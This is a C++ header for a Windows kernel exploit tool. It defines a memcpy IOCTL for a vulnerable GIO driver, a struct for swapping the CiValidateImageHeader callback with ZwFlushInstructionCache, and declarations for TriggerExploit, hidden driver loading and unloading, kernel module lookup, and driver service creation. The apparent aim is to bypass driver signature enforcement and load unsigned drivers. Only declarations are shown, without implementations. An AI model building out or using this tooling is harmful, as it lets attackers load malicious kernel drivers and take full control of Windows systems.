#pragma once
#include <Windows.h>
#include <ntstatus.h>
#include <iostream>
#include <Psapi.h>
#include <cstdio>   
#include <cstdint> 
#include <shlwapi.h>  

#pragma comment(lib, "shlwapi.lib")  
#pragma comment(lib, "ntdll.lib") 

#define FILE_DEVICE_GIO				(0xc350)
#define IOCTL_GIO_MEMCPY			CTL_CODE(FILE_DEVICE_GIO, 0xa02, METHOD_BUFFERED, FILE_ANY_ACCESS)


static WCHAR DriverServiceName[MAX_PATH], LoaderServiceName[MAX_PATH];

struct seCiCallbacks_swap
{
	DWORD64 ciValidateImageHeaderEntry;
	DWORD64 zwFlushInstructionCache;
};

typedef struct _GIOMemcpyInput
{
	ULONG64 Dst;
	ULONG64 Src;
	DWORD Size;
} GIOMemcpyInput, * PGIOMemcpyInput;

namespace vuln {
	NTSTATUS TriggerExploit( _In_ PWSTR LoaderServiceName, _In_ PWSTR DriverServiceName );

	NTSTATUS WindLoadDriver( PWCHAR LoaderName, PWCHAR DriverName, BOOLEAN Hidden );

	NTSTATUS WindUnloadDriver( PWCHAR DriverName, BOOLEAN Hidden );
}


namespace modules {
	NTSTATUS FindKernelModule( PCCH ModuleName, PULONG_PTR ModuleBase );

	ULONG_PTR GetKernelModuleAddress( const char* name );

	seCiCallbacks_swap get_CIValidate_ImageHeaderEntry();

	NTSTATUS OpenDeviceHandle( _Out_ PHANDLE DeviceHandle, _In_ BOOLEAN PrintErrors );

	NTSTATUS CreateDriverService( PWCHAR ServiceName, PWCHAR FileName );

	NTSTATUS LoadDriver( PWCHAR ServiceName );

	NTSTATUS UnloadDriver( PWCHAR ServiceName );
}

namespace helpers {
	DWORD64 FindBytes64( DWORD64 imageBase, SIZE_T imageSize, const unsigned char* pattern, SIZE_T patternLen );

	void FileNameToServiceName( PWCHAR ServiceName, PWCHAR FileName );

	int ConvertToNtPath( PWCHAR Dst, PWCHAR Src );

	void DeleteService( PWCHAR ServiceName );
}

